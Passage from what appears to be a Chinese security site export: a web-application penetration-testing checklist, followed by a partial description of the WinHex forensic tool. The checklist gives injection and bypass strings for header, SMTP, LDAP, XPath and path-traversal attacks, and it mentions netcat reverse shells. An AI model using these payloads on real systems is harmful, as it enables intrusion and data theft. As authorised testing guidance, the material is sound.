测试HTTP消息头注入\n对于在响应消息头中出现的每一个请求参数，确认应用程序是否接受URL编码的回车（%0d）与换行（%0a）符，以及他们是否按原样在响应中返回。请注意，在服务器的响应中寻找的是换行符本身，而不是他们的URL编码形式。 如果在提交专门涉及的输入后，服务器的响应消息头新增了一行，那么应用程序易受到HTTP消息头注入攻击。第13章利用漏洞攻击。 如果服务器的响应中仅返回两个换行符中的一个，根据实际情况，仍可攻击。 如果发现应用程序阻止包含换行符的输入，或者净化出现在响应中的这些字符，尝试使用下面的输入测试过滤的效率： foo%00%0d%0abar foo%250d%250abar foo%%0d0d%%0a0abar 3.7.3.4 测试任意重定向\n如果反射型输入用户指定某类重定向的目标，测试是否可以提交专门设计的输入，生成指向一个外部web站点的重定向。如果可以，渗透测试员就可以利用这种行为提高钓鱼攻击的可信度。 如果应用程序以参数值的形式传送绝对URL，那么修改URL中的域名，测试应用程序是否会重定向到这个域。 如果参数中包含一个相对URL，将这个URL修改成指定另一个域的绝对URL，并测试应用程序是否重定向到这个域。 如果应用程序为防止外部重定向，在进行重定向前对参数进行某种形式的确认，通常仍然可以轻易避开这种确认。尝试使用第13章描述的各种攻击测试过滤的效率。 3.7.3.5 测试保存型攻击\n如果应用程序保存用户提交的输入，并随后在屏幕上显示这些输入，那么，在模糊测试整个应用程序后，可能会发现攻击字符串在本身并未包含这些字符串的请求的响应中返回。留意这种情况，确定被保存数据的原始进入点。 有时，只有完成一个多阶段过程，用户提交的数据才被成功保存。如果应用程序解析过程中确定这种功能，那么手动完成相关过程，并在被保存的数据中查找XSS漏洞。 如果拥有足够的访问权限，应仔细审查可在更高权限的用户绘画中显示低权限用户的数据管理功能。管理功能中存在的任何保存型XSS漏洞旺旺会直接导致权限提升。 测试用户提交的数据被保存且向该用户显示的每一种情况。测试这些情况，从中查找上述XSS和其他响应注入漏洞。 如果发现一个漏洞将一名用户提交的输入显示给其他用户，渗透测试员要确定可用于实现目标的最佳攻击有效载荷，如会话劫持或请求伪造。如果被保存的数据仅向提交该数据的用户显示，那么设法找出办法，连接一经发现的所有漏洞（如不完善的访问控制），从而在其他用户的会话中注入一个攻击。 如果应用程序允许文件上传与下载，始终探查这种功能是否易于受到保存型XSS攻击。如果应用程序允许HTML.JAR或文本文件，且并不确认或净化他们的内容，那么几乎可以肯定他们易于受到攻击。如果它允许JPEG文件且并不确认其中是否包含有效的图像，那么它可能易于受到针对Internet Explorer用户的攻击。测试应用程序如何处理它支持的每种文件类型，并弄清浏览器如何处理包含HTML而非正常内容的影响。 在一名用户提交的数据被显示给其他用户的每一个位置，如果应用程序实施的过滤阻止发动保存型XSS，确定应用程序的行为是否使它易于受到本站点的请求伪造攻击。 3.7.4 测试OS命令注入\n如果任何命令注入攻击字符串导致应用程序在作出响应时出现反常的时间延迟，那么应用程序易于受到OS命令注入。手动重复测试，在-i或-n参数中指定不同的值，确定响应时间是否随着这个值而发生系统性的变化。 使用所发现的任何一个可成功实施攻击的注入字符串，尝试注入另一个更加有用的命令，确定是否能够将命令返回到浏览器上。 如果不能直接获得命令执行结果，还可以采用其他方法。 可以尝试打开一条桐乡自己计算机的带外通道。尝试使用TFTP上传工具至服务器，使用telnet或netcat建立一个通向自己计算机的反向shell，并使用mail命令通过SMTP发送命令结果。 可以将命令结果重定向到WEB根目录下的一个文件，然后使用自己的浏览器直接获取结果。例如，dir \u003e c:\\intpub\\wwwroot\\foo.txt 一旦找到注入命令的方法并能够获得命令执行结果，就应当确定自己的权限（whoami，net state）或者尝试向一个受保护的目录写入一个无害的文件）。然后就可以设法提升自己的权限，进而秘密访问应用程序中的敏感数据，或者通过被攻破的服务器测试其他主机。 如果知道自己的输入被提交给某个OS命令，但提交前面列出的攻击字符串无法成功实施攻击，那么观察是否可以使用\u003c或\u003e字符将一个文件的内容指向命令的输入，或者将命令的输出指向一个文件。可以使用这种方法读取或写入任意文件的内容。如果知道或能够猜测出被执行的命令，尝试注入该命令有关的命令行参数，以有利的方式修改它的行为（例如，指出web根目录中的输入文件）。 如果发现应用程序对实施命令注入所需的某些字符专一，可尝试在字符串中插入转义字符如果应用程序并不对转义字符本身进行转义，就可以利用这种行为避开应用程序的防御机制。如果发现空白符被阻止或净化，竟可以使用$IFS代替在UNIX平台中出现的空格。 3.7.5 测试路径遍历\n对于执行的每次模糊测试，检查所有路径遍历攻击字符串的结果。手动检查并确定其中包含特定文件的内容或其他表示执行了反常文件操作的证据。 在解析应用程序的受攻击面时，还应及其仔细地手动测试，确定所有路径遍历漏洞。 如果某个参数中包含一个文件名、文件名的一部分或一个目录，修改这个参数的值，并在其中插入任意一个子目录和一个遍历序列。 例如，如果应用程序提交参数： file=foo/file1.txt 那么可以尝试提交以下值： file=foo/bar/../file1.txt 如果两种情况下应用程序的行为完全相同，那么它易于受到攻击，渗透测试员应该继续以下步骤。如果在上述两种情况下应用程序的行为有所不同，那么应用程序可能阻止、删除或净化遍历序列，致使文件路径失效。尝试使用第10章描述的编码与其他攻击避开过滤。 如果前面在基础目录中使用遍历序列的测试取得成功，尝试使用其他序列上溯到基础目录，并访问服务器操作系统中的已知文件。如果这些尝试失败，应用程序可能在许可文件访问前实施了各种过滤或检查，应当进行深入分析，了解应用程序实施的控制以及是否可以避开这些控制。 应用程序可能会检查被请求的文件扩展名，只允许用户访问特殊类型的文件。尝试使用空字节或换行符攻击。并在后面连接已知的、应用程序接受的文件扩展名，设法避开过滤。 ../../../../../../../../boot.ini%00.jpg ../../../../../../../etc/passwd%0a.jpg 应用程序可能会检查用户提交的文件路径是否以一个特定的文件名或词根开头。尝试将遍历序列附加在一个已知应用程序接受的词根后面，避开过滤。 例如：/images/../../../../../../../etc/passwd 如果这些攻击无法取得成功，尝试组合使用几种测试技巧，首先对基础目录进行全面的测试，了解应用程序实施的过滤以及它如何处理无法预料的输入。 如果能够读取服务器上的任意文件，尝试获取以下任何一个文件，进而扩大攻击范文。 操作系统与应用程序的密码文件 服务器与应用程序配置文件，发现其他漏洞或优化另一次攻击 可能含有数据库证书的包含文件 应用程序使用的数据源，如MYSQL数据库文件或XML文件 服务器可之行也面对的源代码，一致性搜索漏洞的代码审查 可能包含用户名和会话令牌的应用程序日志文件等 如果能够写入服务器上的人以文件，分析是否可以试试以下攻击，进而扩大攻击范围。 在用户的启动文件夹中创建脚本 当用户下一次连接时，修改in.ftpd等文件执行任意命令 在一个拥有执行许可的web目录中写入脚本，从浏览器调用它们。 3.7.6 测试脚本注入\n对于执行的每一次模糊测试，在结果中搜索111111本身。在Burp Intruder中，按住shift同时点击111111Grep字符串标题，对所有包含这个字符串的结果进行分类，可以迅速确定这些字符串。确定的任何结果都可能易于受到脚本命令注入攻击。 检查使用脚本注入字符串的所有测试，确定所有包含脚本错误消息的测试；这些错误消息表示输入被执行，但造成一个错误，一次可能要对测试进行优化，已成功实施脚本注入。 如果应用程序似乎易于受到攻击，通过注入其它专门针对应用程序所使用的脚本平台的命令，确认漏洞是否存在。例如，可以使用类似于模糊测试OS命令注入时使用的攻击有效载荷：system(‘ping%20127.0.0.1’) 3.7.7 测试文件包含\n如果在模糊测试时收到任何由目标应用程序的基础架构提出的HTTP连接，那么几乎可以肯定应用程序易于受到远程文件包含攻击。以单线程的方式在有限的时间内重复相关测试，确定到底哪些参数致使应用程序提出HTTP请求。 检查文件包含测试结果，确定在应用程序的响应中造成反常延迟的所有测试。在这些情况下，可能应用程序本身已于受到攻击，但HTTP请求可能因为网络级过滤而超时。 如果发现一个远程文件包含漏洞，部署一台包含恶意脚本（专门针对所攻击的语言而编写）的web服务器，使用和测试脚本注入类似的命令确定脚本是否被执行。 3.8 测试特殊功能方面的输入漏洞 3.8.1 测试SMTP注入\n对于电子邮件有关的功能使用的每一个请求，轮流提交以下每个测试字符串作为每个参数，并在相关位置插入电子邮件地址。BURPIntruder可用。 %0aCc: %0d%0aCc: %0aBcc: %0d%0aBcc: %0aDATA%0afoo%0a%2e%0aMAIL+FROM:+%0aRCPT+to:+ %0aDATA%0aFrom:+%0aTo:+%0aSubject:+test%0afoo%0a%2e%0a %0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+%0d%0aRCPT+TO:+%0d%0aDATA%0d%0aFrom:+%0d%0aTo:+%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a 检查测试结果，确定应用程序返回的所有错误消息。如果这些错误与电子邮件功能中的问题有关，确定是否有必要调整输入，以利用漏洞。 应该监控指定的电子邮件地址，看是否收到任何电子邮件。 仔细检查生成相关请求的HTML表单。他们可能提供与服务器端软件有关的线索。其中可能包含一个用于指定电子邮件收件人（to）地址的隐藏或禁用字段，可以直接对其进行修改。 3.8.2 测试本地代码漏洞\n3.8.2.1 测试缓冲区溢出\n向每一个目标数据提交一系列稍大于常用缓冲区大小的长字符串。一次针对一个数据实施攻击，最大程度地覆盖应用程序中的所有代码路径。可以使用Burp Intruder中的字符快有效载荷来源自动成成各种大小的有效载荷。可以对下面的缓冲区大小进行测试，1100,4200,33000。 监控应用程序的影响，确定所有反常现象。任何无法控制的溢出几乎肯定会在应用程序中造成异常，虽然远程诊断问题的本质可能很困难。 寻找以下反常现象： HTTP500状态码或错误消息，这时其他畸形（而非超长）输入不会产生相同的结果。 内容详细的消息，表示某个对外部本地代码组件发生故障。 服务器收到一个局部或畸形响应。 服务器的TCP链接未返回响应，突然关闭。 整个web应用程序停止响应。 应用程序返回出人意料的数据，表示内存中的一个字符串可能“丢失”了它的空终止符。 3.8.2.2 测试整数漏洞\n当测试本地代码组建时，确定所有基于证书的数据。特别是长度指示符，可以利用它触发整数漏洞。 向每一个目标数据提交旨在触发漏洞的适当有效载荷。轮流向每一个目标数据发送一系列不同的值，分别表示不同大小的有符号与无符号整数值的边界情况。 如下所示。 0x7f与0x80(127与128） 0xff与0x100(255与256) 0x7ffff与0x8000(32767与32768） 0x7fffffff与0x80000000(2147483647与214748368） 0xffffffff与0x0(4294967295与0) 当被修改的数据以十六进制表示时，应该发送每个测试字符串的little-endian与big-endian版本，例如，ff7f以及7fff。如果十六进制数字以ASCII形式提交，应该使用应用程序自身使用的字符，确保这些字符被正确编码。 监控应用程序的响应，查找所有反常事件。 3.8.2.3 测试格式化字符串漏洞\n轮流向每一个参数提交包含一长串不同格式说明符的字符串。 例如： %n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s %1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n!%11!n!…… %1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s!%11!s!%…… 这里绕过还应考虑%字符URL编码成%25 监控应用程序的响应，查找所有反常事件。 3.8.3 测试SOAP注入\n轮流测试怀疑通过SOAP消息处理的参数。提交一个恶意XML结束标签，如。没有发生错误就表示该输入可能没有插入SOAP消息中，或者以某种方式被净化。 出现错误就提交一对有效的起始与结束标签，如。如果这对标签使错误消失，应用程序很可能易于受到攻击。 如果提交的攻击字符串在应用程序的响应中原样返回，轮流提交下面两个值。如果发现其中一个值的返回结果为一个一个值，或者只是返回test，那么可以确信该输入被插入到了XML消息中。 test test 如果HTTP其ing求中欧冠包含一个可放入SOAP消息中的参数，尝试在一个参数中插入其实注释字符串。然后，轮换在参数中插入这两个字符（因为无法知道参数出现的顺序）。这样做可能会把服务器SOAP消息中的某个部分作为注释处理，从而改变应用程序的逻辑，或者形成一个可能造成信息泄露的错误条件。 3.8.4 测试LDAP注入\n在任何使用用户提交的数据从一个目录服务中获取信息的功能中，真哦对每个参数，轮流测试是否可以注入LDAP查询。 提交*字符。返回大量结果就说明表示针对的是LDAP查询。 尝试输入大量闭括号。 )))))))))))) 这个输入会使查询语法失效，因此，如果它导致错误或其他反常行为，那么应用程序易于受到攻击（许多其他应用程序功能和注入情况也会造成相同的结果）。 尝试输入干扰不同查询的各种表达式，看是否影响返回的结果。在查询目录未知的情况下cn非常有用，因为所有的LDAP实现都支持这个特性。 )(cn=* ))(|(cn= *))%00 尝试再输入结尾增加其他属性，并用逗号分隔这些属性。轮流测试每一个属性，返回错误消息就表示该属性当前无效。 以下属性常用在由LDAP查询的目录中： cn c mail o ou dc l uid objectclass postaladdress dn sn 3.8.5 测试XPath注入\n尝试提交下面的值，并确定它们是否会使用应用程序的行为发生改变，但不会造成错误： ’ or count(parent::[position()=1])=0 or ‘a’=‘b ’ or count(parent::[position()=1])\u003e0 or ‘a’=‘b 如果参数为数字，尝试提交下面的测试字符串： 1 or count(parent::[position()=1])=0 1 or count(parent::[position()=1])\u003e0 如果上面的任何字符串导致应用程序的行为发生改变，但不会造成错误，很可能可以通过设计测试条件，一次提取一字节的信息，从而获取任意数据。使用一系列以下格式的条件确定当前节点的父节点的名称： substring(namem(parent::*[position()=1]),1,1)=‘a’ 提取出父节点的名称后，使用一系列下列格式的条件提取XML树中的所有数据。 substring{//parentnodename[position()=1]/child::node()[position()=1] 3.8.6 测试后端请求注入\n确定在参数中指定内部服务器名称或IP地址，之后在指定端口上监视传入连接。 针对根据特定值返回特定页面的请求参数，尝试使用以下各种语法附加新的注入参数： %26foo%3dbar(URL编码的\u0026foo=bar) %3bfoo%3dbar(URL编码的;foo=bar) %2526foo%253dbar(双重URL编码的\u0026foo=bar) 如果应用程序的行为与未修改原始参数时相同，说明其中可能存在HTTP参数注入漏洞。这时，可通过注入可能更改后端逻辑的已知参数的名或值来攻击后端那请求。（第10章所述） 3.8.7 测试XXE注入\n如果用户正向服务器提交XML，则可以实施外部实体注入攻击。如果已知会向用户返回某个字段，可以尝试指定一个外部实体，如下所示：\nPOST /search/128/AjaxSearch.ashx HTTP/1.1 Host: mdsec.net Content-Type: text/xml;charset=UTF-8 Content-Length: 115 \u0026xxe; - 如果找不到已知字段，可以将“http://192.168.1.1:25\"指定为外部实体，并监视页面响应时间。如果页面响应的时间明显增长或页面超时，则说明应用程序易于受到攻击。\n3.9 测试逻辑缺陷 3.9.1 确定关键的受攻击面\n为确保探查逻辑缺陷的效率，首先应对受攻击面缩小到一个适当的范围，方便手工测试。 2.检查应用程序解析过程中获得的结果，确定以下情况。\n多阶段过程 重要的安全功能，如登录 新人边界的转换（如登录时由匿名用户转变为注册用户） 检查和调整交易价格和数量 3.9.2 测试多阶段过程\n如果一个多阶段过程需要按预定的顺序提交一系列请求，尝试按其他顺序提交这些请求。尝试完全省略某些阶段，几次访问同一个阶段，或者推后访问前一个阶段。 这些阶段可能通过一系列指向特殊URL的GET或POST请求进行访问，或者需要向同一个URL提交不同的参数。被访问的阶段可通过在被请求的参数中提交功能名称或索引来指定。确保完全了解应用程序访问不同阶段所使用的机制。 除了打乱操作步骤的顺序外，尝试提取在一个过程阶段提交的参数，并在另一个阶段提交这些参数。如果相关数据被应用程序更新，应当确定是否可以利用这种行为破坏应用程序的逻辑。 如果在一个多阶段过程中，不同的用户对同一组数据进行操作，提取某一名用户提交的每一个参数，再由另一名用户提交这些参数。如果应用程序接受并处理这些参数，如果前面所述，探索着中应为的衍生效果。 根据执行功能的情形，了解开发者做出的假设以及主要受攻击面位于何处。设法找到违反这些假设以在应用程序中造成反常应为的方法。 如果不按顺序访问多阶段功能，应用程序常常表现出一系列异常现象，如变量值为空字符或未被初始化，状态仅部分定义或相互矛盾，以及其它无法预料的行为。寻找有用的错误消息和调试结果，可以通过他们进一步了解该功能的内部机制，从而调整当前攻击。或者发动另一次攻击。 3.9.3 测试不完整的输入\n应用程序的红药安全功能需要处理大量用户提交的输入，并根据这些输入作出决策。因此，应测试这些功能对不完整输入的适应性。 轮流测试每一个参数，从请求中删除参数的名称与值。监控应用程序的响应，查找所有行为异常或错误消息，他们可能提供与应用程序逻辑有关的信息。 如果所操纵的请求属于一个多阶段过程，应测试整个过程，因为应用程序可能将前一个阶段的数据保存在绘画中，然后再后一个阶段处理。 3.9.4 测试信任边界\n了解应用程序如果处理不同用户信任状态之间的转换。寻找功能，帮助一名拥有特定信任低地位的用户累积一定量与其身份有关的状态，例如，匿名用户在自我注册过程中提供个人信息，或者完成旨在确认其身份的账户恢复过程。 需找办法，通过在一个区域累计相关状态，在信任边界之间进行不恰当的转换，然后以正常不被允许的方式切换到另一个区域。例如，完成部分账户恢复过程后，尝试切换到与某一名用户有关的通过验证的页面。当进行这种转换时，测试应用程序是否分配了一个不相称的信任级别。 确定是否可利用更高权限的功能直接或间接访问或者猜测某些信息。 3.9.5 测试交易逻辑\n如果应用程序设置交易限额，测试提交负值会造成什么影响。如果应用程序接受负值，就可以通过从反方向大额交易来规避这种限额。 分析是否可以使用一连串的交易达成一种状态，然后利用它达到目的。例如，测试是否可以在账户之间进行几次低额转账，就可以产生一种应用程序的逻辑将会阻止的较大余额。 如果应用程序根据用户控制的数据或操作确定的标准调整价格或其他民安价值，首先应了解应用程序使用的算法以及需要调整的逻辑。确定这些调整是一次性行为，还是需要根据用户执行的其他操作进行修改。 努力想办法操纵应用程序的行为，使应用程序进行的调整与开发者最初设定的标准相互矛盾。 3.10 测试共享主机漏洞 3.10.1 测试共享基础架构之间的隔离\n如果应用程序在一个共享基础架构中运行，分析它为共享环境中的客户端提供的用于更新和管理其内容与功能的访问机制。考虑以下问题。 远程访问机制是否使用一个安全的协议与经过适当强化的基础架构？ 客户端是否能够访问他们正常情况下不能访问的文件、数据以及其他资源？ 客户端是否能够在主机环境中获得一个交互式的shell，并执行任意命令？ 如果使用一个所有权应用程序，以方便客户端配置和定制共享环境，考虑是否能够以这个应用程序为攻击目标，攻破该环境本身以及其中运行的所有应用程序。 如果能够在某个应用程序中执行命令、注入SQL脚本或访问任意文件，仔细研究，看是否能够以此扩大攻击范围，攻破其他应用程序。 3.10.2 测试使用ASP主机的应用程序之间的隔离\n如果使用ASP主机的应用程序由许多共享与定制组件构成，确定其中的任意共享组件，如日志机制、管理功能以及数据库代码组件，尝试利用这些组件攻破应用程序的共享部分，进而攻破其他应用程序。 如果共享环境使用一个常用的数据库，使用NGSSquirrel之类的数据库扫描工具，全年审查数据库配置、补丁版本、表结构以及许可。数据库安全模型中存在的任何缺陷都可以加以利用，将攻击范围由一个应用程序扩大到另一个应用程序。 3.11 测试Web服务器漏洞 3.11.1 测试默认证书\n检查应用程序解析过程中获得的结果，确定应用程序使用的、可能包含可访问的管理接口WEB服务器与其他技术。 对WEB服务器进行端口扫描，确定在指向目标应用程序的不同端口上运行的所有管理接口。 对于确定的接口。查阅制造商文档资料与常用默认密码表，获得默认证书。 如果默认证书无效，使用3.4提到的技巧尝试猜测有效的证书。 如果能够访问管理接口，审查可用的功能，确定是否可以利用这项功能进一步攻破主机与主应用程序。 3.11.2 测试默认内容\n分析Nikto扫描结果，确定服务器上存在的、但并不属于应用程序的默认内容。 使用搜索引擎与其他资源（如exploit-db.com）确定已知应用程序所使用的技术的默认内容与功能。如有可能，在本地安装这些技术，并在其中查找可在渗透测试中利用的所有默认功能。 检查默认内容，从中查找任何可用于攻击服务器或应用程序的功能或漏洞。 3.11.3 测试危险的HTTP方法\n使用OPTIONS方法列出服务器使用的HTTP方法。请注意，不同目录中激活的方法可能各不相同。可以使用Paros进行漏洞扫描，帮助完成这个检查。 手动测试每一种方法，确认其是否可用。 如果发现一些WEBDEV方法被激活，使用一个激活WEBDEV的客户端进行深入调查，如果MicrosoftFrontPage或Internet Explorer中的Open as WebFolder（以web文件夹打开）选项。 3.11.4 测试代理功能\n使用GET与CONNECT请求，尝试使用WEB服务器作为代理服务器，连接因特网上的服务器，并获取其中的内容。 尝试使用前面描述的两种技巧连接主机基础架构中的不同IP地址与端口。 尝试使用前面描述的两种技巧，在请求中指定127.0.0.1为目标主机，连接web服务器上的常用端口号。 3.11.5 测试虚拟机配置不当\n使用以下方式向根目录提交GET请求： 正确的HOST消息头 恶意的HOST消息头 HOST消息头中的服务器IP地址 无HOST消息头（仅使用HTTP/1.0) 比较对这些请求的响应。常见的结果是，在HOST消息头中使用服务器的IP地址获得目录列表。还可以获得各种默认内容。 如果观测到应用程序表现出不同的行为，使用生成不同结果的主机名称重复3.1的应用程序解析过程。一定要用-vhost选项进行一次Nikto扫描，确定在最初的应用程序解析过程中忽略的默认内容。 3.11.6 测试web服务器软件漏洞\n使用Nessus 与所拥有的所有其他类似的扫描器，确定所测试的web服务器软件中存在的所有已知漏洞。 同时，浏览SecurityFocus、Bugtraq和Full Disclosure等资源，在攻击目标中查找最近发现的、尚未修复的漏洞信息。 如果应用程序由第三方开发，确定它是否自带web服务器（通常为一个开源服务器）；如果是，在这个服务器中查找所有漏洞。注意，这种情况下，服务器的标准版本信息可能已被修改。 如有可能，应该考虑在本地安装所测试的软件，并自己进行测试，查找尚未发现或广泛流传的新漏洞。 3.11.7 测试web应用程序防火墙\n在参数值中使用明确的攻击有效载荷向应用程序（最好是响应中包含名称和/或值的某个应用程序位置）提交人意参数名称。如果应用程序阻止该攻击，这可能是由于外部防御机制所致。 如果可以提交在服务器响应中返回的变量，则提供一系列模糊测试字符串及这些字符串的编码形式可以确定应用程序的用户输入防御行为。 对应用程序中的变量实施相同的攻击来确认这一行为。 对于所有模糊测试字符串和请求，使用标准签名数据库中不可能存在的有效载荷字符串。根据定义，我们不可能提供这些字符串的示例。但是，在尽心文件检索时，应避免将/etc/passwd或/windows/system32/config/sam作为有效载荷。此外，应在XSS公鸡中避免使用,并避免将alert()或xss用作XSS有效载荷。 如果特定请求被阻止，可以尝试在其他位置或上下文中提交相同的参数。例如，在GET请求的URL中、在POST请求主题中，以及在POST请求的URL中提交相同的参数。 此外，应尝试在ASP.NET上将参数作为cookie提交。如果在查询字符串或消息主题中找不到参数foo，API Request.Params[“foo”]会检索名为foo的cookie的值。 回顾第四章的引入用户输入的所有其他方法，选择其中任何不受保护的方法。 确定以非标准格式（如序列化或编码）或可能以此类格式提交用户输入的位置。如果找不到此类位置，可以通过串联字符串和/或将字符串分布到多个参数中来构建攻击字符串。（注意，如果目标是ASP.NET，可以使用HPP通过同一变量的各种变体来串联攻击字符串。） 3.12 其他检查 3.12.1 测试基于DOM的攻击\n对应用程序中包含的每一段JS脚本进行简单的代码审查，确定可通过任意一个专门设计的URL，在相关页面的DOM中引入恶意数据而出发的XSS或重定向漏洞。审查内容包含HTML页面（无论静态或动态生成的页面）中的所有单独的JS文本和脚本。 确定使用以下API的所有情况，使用这些API可访问通过一个专门设计的URL控制的DOM数据： document.location document.URL document.URLUnencoded document.referer window.location 在代码中追踪相关数据，确定应用程序对它执行何种操作。如果数据（或它的一个被操纵的表单）被提交给下列API中的一个，那么应用程序可能易于受到XSS攻击： document.write() document.writeln() document.body.nnerHtm eval() window.execScript() window.setInterval() window.setTimeout() 如果数据被提交给下列API中的一个，那么应用程序可能易于受到重定向攻击： document.location document.URL document.open() window.location.href window.navigate() window.open() 3.12.2 测试本地隐私漏洞\n1.检查拦截代理服务器生成的日志，确定测试过程中应用程序送出的所有Set-cookie指令。如果发现有任何set-cookie指令包含一个将来日期的expires属性，用户的浏览器会将该cookie保持到这个日期。检查传送米干数据的吃捷星cookie的所有内容。\n如果一个持久性cookie中包含敏感数据，那么本地攻击者就能够截获这些数据。即使这些数据被加密，截获他们的攻击者仍然可以将这个cookie重新提交给应用程序，访问该cookie访问的任何数据或功能。 如果包含敏感数据的页面通过HTTP访问，在服务器响应中寻找缓存指令。如果其中没有下列指令（在HTTP消息头或HTML元标签中），那么相关页面可能被一个或几个浏览器存入缓存： Expires: 0 Cache-control: no-cache Pragma: no-cache 确定应用程序中通过URL参数传送敏感数据的所有情况。如果存在这样的情况，检查浏览器的历史记录，正式这些数据已经保存在那里。 对于用户提交敏感数据（如信用卡信息）的所有表单，审查其中的HTML源代码。如果没有在表单标签或输入字段的标签中设置autocomplete=off属性，输入的数据将会保存在激活自动完成的浏览器中。 3.12.3 测试脆弱的SSL加密算法\n如果应用程序使用SSL进行通信，使用THCSSLCheck工具列出它支持的加密算法和协议。 如果SSL支持脆弱或过时的加密算法和协议，处在适当位置的攻击者就可以实施攻击，降级或破译应用程序用户的SSL通信，访问他们的敏感数据。 一些web服务器生成它支持某些脆弱加密算法和协议，但如果客户提出请求，它实际上拒绝使用这些算法和协议完成握手。在使用THCSSLCheek工具时，这种情况可能会造成错误警报可以使用Opear浏览器，尝试通过制定的脆弱协议完成一次握手，确定是否可使用这些协议访问应用程序。 3.12.4 检查同源策略配置\n检查/crossdomain.xml文件。如果应用程序允许无限制访问（通过指定)，来自其他站点的Flash对象可以“叠置”应用程序用户的会话，以进行双向交互。这导致任何其他域可以检索所有数据，并执行任何用户操作。 检查/clientaccesspolicy.xml文件。与Flash类似，如果配置过于宽泛，其他站点将可以与接收测试的站点进行双向交互。 通过添加指定其他的Origin消息头并检查返回的任何Access-Control消息头，使用XMLHttpRequest测试应用程序如何处理跨域请求。允许任何域、或指定的其他域进行双向交互的安全隐患与Flash跨域策略造成的安全隐患相同。 3.13 检查信息泄露 在探查目标应用程序的整个过程中，监控它的响应，查找可能包含与错误原因、所使用技术以及应用程序的内部结构与功能有关的错误消息。 如果收到不常见的错误消息，使用标准的搜索引擎检查这些消息。可以使用各种高级搜索特性缩小搜索范围。例如： “unable to retrieve\" filetype:php 检查搜索结果，寻找关于错误消息的所有讨论以及其他出现相同消息的所有站点。其他应用程序生成的同一条错误消息可能更详细，有助于渗透测试人员更好地了解错误条件。使用搜索引擎缓存获取不再出现在当前应用程序中的错误消息。 使用Google代码搜索查找生成特定错误消息的、公开发布的所有代码。搜索可能被硬编码到应用程序源代码中的错误消息代码段。还可以使用各种高级搜索特性指定代码语言及其他已知的细节。例如： unable\\ to\\ retrieve lang:php package:mail 如果获得包含库与第三方代码组件名称的栈追踪错误消息，在上述两种搜索引擎中搜索这些名称。 ",
    "description": "",
    "tags": null,
    "title": "web应用渗透测试方法论",
    "uri": "/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "windows",
    "uri": "/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/index.html"
  },
  {
    "content": "https://www.jianshu.com/p/f14a41e8cfbe\n官网 http://www.x-ways.com/index-c.html\nwinhex http://www.x-ways.com/winhex/index-m.html\nWinHex：计算机取证和数据恢复软件，\n十六进制编辑器和磁盘编辑器\nWindows XP / 2003 / Vista / 2008/7/8 / 8.1 / 2012/10 / 2016，32位/ 64位*\n特性 WinHex的核心是通用的十六进制编辑器，在计算机取证，数据恢复，低级数据处理和IT安全领域特别有用。日常和紧急使用的高级工具：检查和编辑所有类型的文件，从文件系统损坏的硬盘驱动器或数码相机卡中恢复已删除的文件或丢失的数据。功能取决于许可证类型（许可证类型比较），其中：\n硬盘，软盘，CD-ROM和DVD，ZIP，智能媒体，紧凑型闪存等的磁盘编辑器… 对于FAT12 / 16/32，exFAT的，NTFS和Ext2 / 3/4，本机支持Next3 ® ，CDFS，UDF RAID系统和动态磁盘的内置解释 各种数据恢复技术 RAM编辑器，提供对物理RAM和其他进程的虚拟内存的访问 数据解释器，了解20种数据类型 使用模板编辑数据结构 （例如，修复分区表/引导扇区） 串联和分割文件，统一和分割奇数和偶数字节/字 分析和比较文件 特别灵活的搜索和替换功能 磁盘克隆 （在DOS下使用X-Ways副本） 驱动器映像和备份（可选压缩或拆分为650 MB存档） 编程接口（API）和脚本 256位AES加密，校验和，CRC32，哈希（MD5，SHA-1等） 安全擦除（擦除）机密文件，清理硬盘 以保护您的隐私 导入所有剪贴板格式，包括 ASCII十六进制值 在二进制，十六进制ASCII，Intel十六进制和Motorola S之间进行转换 字符集：ANSI ASCII，IBM ASCII，EBCDIC，（Unicode） 即时窗口切换。印刷。随机数生成器。 支持任何大小的文件。非常快。易于使用。广泛的程序帮助。 更多的 ** **\n下载 http://www.x-ways.net/winhex.zip\n用户手册 http://www.x-ways.com/winhex/manual.pdf\n关于数据恢复部分 使用目录浏览器进行文件恢复 最明显的是，目录浏览器中列出的已删除文件和目录可以通过目录浏览器的上下文菜单轻松、有选择地恢复。导航到一个目录（或递归地浏览根目录），选择要恢复的文件，然后使用上下文菜单中的recover/Copy命令。参见“目录浏览器”一章。理想情况下，首先优化卷快照，以便在目录浏览器中找到并列出更多以前存在的文件。\n按类型/文件头签名搜索的文件恢复 磁盘工具菜单中的数据恢复功能，以及查找以前存在的文件的策略（作为优化卷快照命令的一部分）。这种恢复方法也被称为“文件雕刻”。它搜索可由特征文件头签名（特定的字节值序列）识别的文件。由于这种方法，文件雕刻不依赖于功能文件系统结构的存在。\n按类型恢复文件：根据文件头签名找到的文件将被雕刻并存储在您自己的驱动器上指定的输出文件夹中。（可选）将每种类型的恢复文件放入各自的子文件夹（…\\JPEG，…\\HTML等）。文件的假定内容实际上是复制的。\n文件头签名搜索：根据文件头签名找到的文件不会存储在任何位置，而只是列在卷快照的专用虚拟目录中。只存储对文件的引用（人工生成的名称、假定大小、起始偏移量…）。当需要查看/复制文件时，可以动态地从原始磁盘/图像中读取文件内容。或者，您可以将文件从单独的文件头签名搜索操作输出到单独的子目录中，以便在需要时更容易区分它们。\n请注意，文件雕刻通常假定连续的文件簇，因此如果文件最初以碎片方式存储，则会生成损坏的文件。存在以下例外情况：如果在具有除Ext2/Ext3以外的受支持文件系统的卷中进行文件头签名搜索时，在可用空间中的群集边界处发现文件的开头，则默认情况下，假定数据可能在文件系统标记为正在使用的群集之后流动。这将正确地重建在其他文件之后创建并存储在其他文件周围的文件，然后删除这些文件，只要发布的集群没有被重复使用并随后被覆盖。要防止文件以这种方式完全在可用空间中